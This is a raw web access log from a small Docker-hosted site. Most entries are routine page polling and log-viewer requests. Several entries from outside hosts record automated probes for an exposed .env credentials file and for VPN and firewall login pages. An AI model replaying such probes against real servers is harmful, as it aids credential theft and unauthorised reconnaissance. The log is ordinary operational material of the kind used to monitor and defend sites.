173.48.140.140 - - [20/Dec/2023:04:48:23 +0000] "GET /logs/logtail.php?page=20 HTTP/2.0" 200 2000 "-" "-" 405 "logpager@docker" "http://172.20.0.3:80" 110ms
173.48.140.140 - - [20/Dec/2023:04:48:24 +0000] "GET /logs/logtail.php?page=21 HTTP/2.0" 200 2182 "-" "-" 406 "logpager@docker" "http://172.20.0.3:80" 123ms
173.48.140.140 - - [20/Dec/2023:04:48:25 +0000] "GET /logs/logtail.php?page=22 HTTP/2.0" 200 2319 "-" "-" 407 "logpager@docker" "http://172.20.0.3:80" 137ms
173.48.140.140 - - [20/Dec/2023:04:48:26 +0000] "GET /logs/logtail.php?page=23 HTTP/2.0" 200 2316 "-" "-" 408 "logpager@docker" "http://172.20.0.3:80" 151ms
173.48.140.140 - - [20/Dec/2023:04:48:27 +0000] "GET /logs/logtail.php?page=24 HTTP/2.0" 200 2234 "-" "-" 409 "logpager@docker" "http://172.20.0.3:80" 194ms
173.48.140.140 - - [20/Dec/2023:04:48:28 +0000] "GET /logs/logtail.php?page=25 HTTP/2.0" 200 2110 "-" "-" 410 "logpager@docker" "http://172.20.0.3:80" 168ms
173.48.140.140 - - [20/Dec/2023:04:48:28 +0000] "GET /logs/logtail.php?page=26 HTTP/2.0" 200 2398 "-" "-" 411 "logpager@docker" "http://172.20.0.3:80" 179ms
173.48.140.140 - - [20/Dec/2023:04:48:29 +0000] "GET /logs/logtail.php?page=27 HTTP/2.0" 200 2394 "-" "-" 412 "logpager@docker" "http://172.20.0.3:80" 181ms
173.48.140.140 - - [20/Dec/2023:04:48:30 +0000] "GET /logs/logtail.php?page=28 HTTP/2.0" 200 2373 "-" "-" 413 "logpager@docker" "http://172.20.0.3:80" 203ms
173.48.140.140 - - [20/Dec/2023:04:48:31 +0000] "GET /logs/logtail.php?page=29 HTTP/2.0" 200 2414 "-" "-" 414 "logpager@docker" "http://172.20.0.3:80" 214ms
173.48.140.140 - - [20/Dec/2023:04:48:32 +0000] "GET /logs/logtail.php?page=30 HTTP/2.0" 200 2381 "-" "-" 415 "logpager@docker" "http://172.20.0.3:80" 308ms
173.48.140.140 - - [20/Dec/2023:04:48:34 +0000] "GET /logs/logtail.php?page=31 HTTP/2.0" 200 2496 "-" "-" 416 "logpager@docker" "http://172.20.0.3:80" 292ms
167.71.120.76 - - [20/Dec/2023:04:48:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 417 "www@docker" "http://172.20.0.9:80" 0ms
173.48.140.140 - - [20/Dec/2023:04:48:35 +0000] "GET /logs/logtail.php?page=32 HTTP/2.0" 200 2477 "-" "-" 418 "logpager@docker" "http://172.20.0.3:80" 320ms
173.48.140.140 - - [20/Dec/2023:04:48:36 +0000] "GET /logs/logtail.php?page=33 HTTP/2.0" 200 2515 "-" "-" 419 "logpager@docker" "http://172.20.0.3:80" 319ms
173.48.140.140 - - [20/Dec/2023:04:48:37 +0000] "GET /logs/logtail.php?page=34 HTTP/2.0" 200 2242 "-" "-" 420 "logpager@docker" "http://172.20.0.3:80" 325ms
173.48.140.140 - - [20/Dec/2023:04:48:38 +0000] "GET /logs/logtail.php?page=35 HTTP/2.0" 200 2548 "-" "-" 421 "logpager@docker" "http://172.20.0.3:80" 312ms
173.48.140.140 - - [20/Dec/2023:04:48:39 +0000] "GET /logs/logtail.php?page=36 HTTP/2.0" 200 2596 "-" "-" 422 "logpager@docker" "http://172.20.0.3:80" 326ms
173.48.140.140 - - [20/Dec/2023:04:48:40 +0000] "GET /logs/logtail.php?page=37 HTTP/2.0" 200 2490 "-" "-" 423 "logpager@docker" "http://172.20.0.3:80" 351ms
173.48.140.140 - - [20/Dec/2023:04:48:41 +0000] "GET /logs/logtail.php?page=38 HTTP/2.0" 200 2498 "-" "-" 424 "logpager@docker" "http://172.20.0.3:80" 371ms
173.48.140.140 - - [20/Dec/2023:04:48:43 +0000] "GET /logs/logtail.php?page=39 HTTP/2.0" 200 2439 "-" "-" 425 "logpager@docker" "http://172.20.0.3:80" 369ms
173.48.140.140 - - [20/Dec/2023:04:48:44 +0000] "GET /logs/logtail.php?page=40 HTTP/2.0" 200 2511 "-" "-" 426 "logpager@docker" "http://172.20.0.3:80" 390ms
173.48.140.140 - - [20/Dec/2023:04:48:45 +0000] "GET /logs/logtail.php?page=41 HTTP/2.0" 200 1971 "-" "-" 427 "logpager@docker" "http://172.20.0.3:80" 412ms
173.48.140.140 - - [20/Dec/2023:04:48:46 +0000] "GET /logs/logtail.php?page=42 HTTP/2.0" 200 1945 "-" "-" 428 "logpager@docker" "http://172.20.0.3:80" 412ms
173.48.140.140 - - [20/Dec/2023:04:48:47 +0000] "GET /logs/logtail.php?page=43 HTTP/2.0" 200 1996 "-" "-" 429 "logpager@docker" "http://172.20.0.3:80" 445ms
173.48.140.140 - - [20/Dec/2023:04:48:49 +0000] "GET /logs/logtail.php?page=44 HTTP/2.0" 200 2093 "-" "-" 430 "logpager@docker" "http://172.20.0.3:80" 463ms
173.48.140.140 - - [20/Dec/2023:04:48:50 +0000] "GET /logs/logtail.php?page=45 HTTP/2.0" 200 1946 "-" "-" 431 "logpager@docker" "http://172.20.0.3:80" 496ms
173.48.140.140 - - [20/Dec/2023:04:48:51 +0000] "GET /logs/logtail.php?page=46 HTTP/2.0" 200 1965 "-" "-" 432 "logpager@docker" "http://172.20.0.3:80" 487ms
173.48.140.140 - - [20/Dec/2023:04:48:52 +0000] "GET /logs/logtail.php?page=47 HTTP/2.0" 200 1945 "-" "-" 433 "logpager@docker" "http://172.20.0.3:80" 500ms
173.48.140.140 - - [20/Dec/2023:04:48:53 +0000] "GET /logs/logtail.php?page=48 HTTP/2.0" 200 1943 "-" "-" 434 "logpager@docker" "http://172.20.0.3:80" 596ms
173.48.140.140 - - [20/Dec/2023:04:48:55 +0000] "GET /logs/logtail.php?page=49 HTTP/2.0" 200 1964 "-" "-" 435 "logpager@docker" "http://172.20.0.3:80" 647ms
173.48.140.140 - - [20/Dec/2023:04:48:56 +0000] "GET /logs/logtail.php?page=50 HTTP/2.0" 200 1976 "-" "-" 436 "logpager@docker" "http://172.20.0.3:80" 753ms
173.48.140.140 - - [20/Dec/2023:04:48:58 +0000] "GET /logs/logtail.php?page=51 HTTP/2.0" 200 1944 "-" "-" 437 "logpager@docker" "http://172.20.0.3:80" 707ms
173.48.140.140 - - [20/Dec/2023:04:48:59 +0000] "GET /logs/logtail.php?page=52 HTTP/2.0" 200 1940 "-" "-" 438 "logpager@docker" "http://172.20.0.3:80" 673ms
173.48.140.140 - - [20/Dec/2023:04:49:01 +0000] "GET /logs/logtail.php?page=53 HTTP/2.0" 200 1988 "-" "-" 439 "logpager@docker" "http://172.20.0.3:80" 713ms
173.48.140.140 - - [20/Dec/2023:04:49:02 +0000] "GET /logs/logtail.php?page=54 HTTP/2.0" 200 1945 "-" "-" 440 "logpager@docker" "http://172.20.0.3:80" 684ms
173.48.140.140 - - [20/Dec/2023:04:49:04 +0000] "GET /logs/logtail.php?page=55 HTTP/2.0" 200 1943 "-" "-" 441 "logpager@docker" "http://172.20.0.3:80" 683ms
173.48.140.140 - - [20/Dec/2023:04:49:05 +0000] "GET /logs/logtail.php?page=56 HTTP/2.0" 200 1939 "-" "-" 442 "logpager@docker" "http://172.20.0.3:80" 739ms
173.48.140.140 - - [20/Dec/2023:04:49:07 +0000] "GET /logs/logtail.php?page=57 HTTP/2.0" 200 1945 "-" "-" 443 "logpager@docker" "http://172.20.0.3:80" 712ms
173.48.140.140 - - [20/Dec/2023:04:49:08 +0000] "GET /logs/logtail.php?page=58 HTTP/2.0" 200 1955 "-" "-" 444 "logpager@docker" "http://172.20.0.3:80" 709ms
173.48.140.140 - - [20/Dec/2023:04:49:09 +0000] "GET /logs/logtail.php?page=59 HTTP/2.0" 200 1955 "-" "-" 445 "logpager@docker" "http://172.20.0.3:80" 753ms
159.203.109.206 - - [20/Dec/2023:04:49:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 446 "www@docker" "http://172.20.0.9:80" 1ms
173.48.140.140 - - [20/Dec/2023:04:49:23 +0000] "GET /logs/logtail.php?page=60 HTTP/2.0" 200 1945 "-" "-" 447 "logpager@docker" "http://172.20.0.3:80" 790ms
173.48.140.140 - - [20/Dec/2023:04:49:26 +0000] "GET /logs/logtail.php?page=61 HTTP/2.0" 200 1944 "-" "-" 448 "logpager@docker" "http://172.20.0.3:80" 777ms
173.48.140.140 - - [20/Dec/2023:04:49:28 +0000] "GET /logs/logtail.php?page=62 HTTP/2.0" 200 1983 "-" "-" 449 "logpager@docker" "http://172.20.0.3:80" 817ms
173.48.140.140 - - [20/Dec/2023:04:49:30 +0000] "GET /logs/logtail.php?page=63 HTTP/2.0" 200 1966 "-" "-" 450 "logpager@docker" "http://172.20.0.3:80" 848ms
173.48.140.140 - - [20/Dec/2023:04:49:31 +0000] "GET /logs/logtail.php?page=64 HTTP/2.0" 200 1972 "-" "-" 451 "logpager@docker" "http://172.20.0.3:80" 839ms
167.71.120.76 - - [20/Dec/2023:04:49:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 453 "www@docker" "http://172.20.0.9:80" 0ms
173.48.140.140 - - [20/Dec/2023:04:49:33 +0000] "GET /logs/logtail.php?page=65 HTTP/2.0" 200 1942 "-" "-" 452 "logpager@docker" "http://172.20.0.3:80" 856ms
173.48.140.140 - - [20/Dec/2023:04:49:35 +0000] "GET /logs/logtail.php?page=66 HTTP/2.0" 200 2022 "-" "-" 454 "logpager@docker" "http://172.20.0.3:80" 911ms
173.48.140.140 - - [20/Dec/2023:04:49:38 +0000] "GET /logs/logtail.php?page=67 HTTP/2.0" 200 1941 "-" "-" 455 "logpager@docker" "http://172.20.0.3:80" 913ms
173.48.140.140 - - [20/Dec/2023:04:49:42 +0000] "GET /logs/logtail.php?page=68 HTTP/2.0" 200 1964 "-" "-" 456 "logpager@docker" "http://172.20.0.3:80" 1954ms
173.48.140.140 - - [20/Dec/2023:04:49:42 +0000] "GET /logs/logtail.php?page=69 HTTP/2.0" 200 1948 "-" "-" 457 "logpager@docker" "http://172.20.0.3:80" 1937ms
173.48.140.140 - - [20/Dec/2023:04:49:46 +0000] "GET /logs/logtail.php?page=70 HTTP/2.0" 200 1934 "-" "-" 458 "logpager@docker" "http://172.20.0.3:80" 3313ms
173.48.140.140 - - [20/Dec/2023:04:49:46 +0000] "GET /logs/logtail.php?page=71 HTTP/2.0" 200 1945 "-" "-" 459 "logpager@docker" "http://172.20.0.3:80" 3957ms
173.48.140.140 - - [20/Dec/2023:04:49:46 +0000] "GET /logs/logtail.php?page=72 HTTP/2.0" 200 1943 "-" "-" 460 "logpager@docker" "http://172.20.0.3:80" 4132ms
173.48.140.140 - - [20/Dec/2023:04:49:46 +0000] "GET /logs/logtail.php?page=73 HTTP/2.0" 200 1959 "-" "-" 461 "logpager@docker" "http://172.20.0.3:80" 4481ms
173.48.140.140 - - [20/Dec/2023:04:49:47 +0000] "GET /logs/logtail.php?page=74 HTTP/2.0" 200 1941 "-" "-" 462 "logpager@docker" "http://172.20.0.3:80" 4613ms
159.203.109.206 - - [20/Dec/2023:04:50:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 463 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:04:50:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 464 "www@docker" "http://172.20.0.9:80" 0ms
180.149.125.168 - - [20/Dec/2023:04:50:35 +0000] "GET /c/ HTTP/1.1" 301 17 "-" "-" 465 "web-to-websecure@internal" "-" 0ms
180.149.125.168 - - [20/Dec/2023:04:50:36 +0000] "GET /c/ HTTP/1.1" 404 19 "-" "-" 466 "-" "-" 0ms
54.36.115.221 - - [20/Dec/2023:04:51:08 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 467 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [20/Dec/2023:04:51:08 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 468 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:04:51:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 469 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:04:51:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 470 "www@docker" "http://172.20.0.9:80" 0ms
173.48.140.140 - - [20/Dec/2023:04:51:44 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2150 "-" "-" 471 "logpager@docker" "http://172.20.0.3:80" 6ms
159.203.109.206 - - [20/Dec/2023:04:52:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 472 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:04:52:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 473 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:04:53:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 474 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:04:53:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 475 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:04:54:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 476 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:04:54:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 477 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:04:55:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 478 "www@docker" "http://172.20.0.9:80" 0ms
173.48.140.140 - - [20/Dec/2023:04:55:23 +0000] "GET /logs/ HTTP/2.0" 200 2476 "-" "-" 479 "logpager@docker" "http://172.20.0.3:80" 1ms
173.48.140.140 - - [20/Dec/2023:04:55:23 +0000] "GET /logs/styles.css?version=16 HTTP/2.0" 200 1864 "-" "-" 480 "logpager@docker" "http://172.20.0.3:80" 0ms
173.48.140.140 - - [20/Dec/2023:04:55:23 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2008 "-" "-" 481 "logpager@docker" "http://172.20.0.3:80" 3ms
173.48.140.140 - - [20/Dec/2023:04:55:32 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 2246 "-" "-" 482 "logpager@docker" "http://172.20.0.3:80" 6ms
167.71.120.76 - - [20/Dec/2023:04:55:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 483 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:04:56:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 484 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:04:56:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 485 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:04:57:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 486 "www@docker" "http://172.20.0.9:80" 0ms
173.48.140.140 - - [20/Dec/2023:04:57:25 +0000] "GET /trace/ HTTP/2.0" 200 6089 "-" "-" 487 "livetrace@docker" "http://172.20.0.5:80" 76ms
173.48.140.140 - - [20/Dec/2023:04:57:25 +0000] "GET /trace/styles.css?version=13 HTTP/2.0" 200 1423 "-" "-" 488 "livetrace@docker" "http://172.20.0.5:80" 1ms
167.71.120.76 - - [20/Dec/2023:04:57:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 489 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:04:58:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 490 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:04:58:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 491 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:04:59:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 492 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:04:59:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 493 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:05:00:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 494 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:05:00:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 495 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:05:01:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 496 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:05:01:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 497 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:05:02:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 498 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:05:02:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 499 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:05:03:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 500 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:05:03:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 501 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:05:04:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 502 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:05:04:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 503 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:05:05:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 504 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:05:05:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 505 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:05:06:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 506 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:05:06:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 507 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:05:07:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 508 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:05:07:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 509 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:05:08:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 510 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:05:08:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 511 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:05:09:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 512 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:05:09:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 513 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:05:10:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 514 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:05:10:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 515 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:05:11:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 516 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:05:11:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 517 "www@docker" "http://172.20.0.9:80" 0ms
146.70.15.33 - - [20/Dec/2023:05:11:38 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 518 "web-to-websecure@internal" "-" 0ms
146.70.15.33 - - [20/Dec/2023:05:11:40 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 519 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:05:12:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 520 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:05:12:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 521 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:05:13:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 522 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:05:13:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 523 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:05:14:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 524 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:05:14:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 525 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:05:15:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 526 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:05:15:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 527 "www@docker" "http://172.20.0.9:80" 1ms
143.110.222.166 - - [20/Dec/2023:05:15:49 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 528 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:05:16:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 529 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:05:16:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 530 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:05:17:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 531 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:05:17:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 532 "www@docker" "http://172.20.0.9:80" 0ms
95.214.235.169 - - [20/Dec/2023:05:17:51 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 533 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [20/Dec/2023:05:18:08 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 534 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:05:18:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 535 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:05:18:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 536 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:05:19:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 537 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:05:19:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 538 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:05:20:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 539 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:05:20:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 540 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:05:21:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 541 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:05:21:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 542 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:05:22:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 543 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:05:22:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 544 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:05:23:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 545 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:05:23:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 546 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:05:24:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 547 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:05:24:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 548 "www@docker" "http://172.20.0.9:80" 0ms
57.129.23.166 - - [20/Dec/2023:05:24:55 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 549 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [20/Dec/2023:05:24:55 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 550 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:05:25:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 551 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:05:25:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 552 "www@docker" "http://172.20.0.9:80" 0ms
91.92.249.130 - - [20/Dec/2023:05:25:48 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 553 "-" "-" 0ms
91.92.249.130 - - [20/Dec/2023:05:25:50 +0000] "GET /+CSCOE+/logon.html HTTP/1.1" 404 19 "-" "-" 554 "-" "-" 0ms
91.92.249.130 - - [20/Dec/2023:05:25:54 +0000] "GET /vpn/index.html HTTP/1.1" 404 19 "-" "-" 555 "-" "-" 0ms
91.92.249.130 - - [20/Dec/2023:05:25:57 +0000] "GET /global-protect/login.esp HTTP/1.1" 404 19 "-" "-" 556 "-" "-" 0ms
91.92.249.130 - - [20/Dec/2023:05:26:00 +0000] "GET /sslvpn_logon.shtml HTTP/1.1" 404 19 "-" "-" 557 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:05:26:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 558 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:05:26:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 559 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:05:27:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 560 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:05:27:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 561 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:05:28:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 562 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:05:28:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 563 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:05:29:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 564 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:05:29:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 565 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:05:30:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 566 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:05:30:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 567 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:05:31:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 568 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:05:31:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 569 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:05:32:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 570 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:05:32:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 571 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:05:33:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 572 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:05:33:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 573 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:05:34:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 574 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:05:34:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 575 "www@docker" "http://172.20.0.9:80" 0ms
173.48.140.140 - - [20/Dec/2023:05:34:41 +0000] "GET /trace/startping.php?id=hs9bw70we HTTP/2.0" 200 105 "-" "-" 576 "livetrace@docker" "http://172.20.0.5:80" 11ms
173.48.140.140 - - [20/Dec/2023:05:34:42 +0000] "GET /trace/pollping.php?id=hs9bw70we HTTP/2.0" 200 35 "-" "-" 577 "livetrace@docker" "http://172.20.0.5:80" 9ms
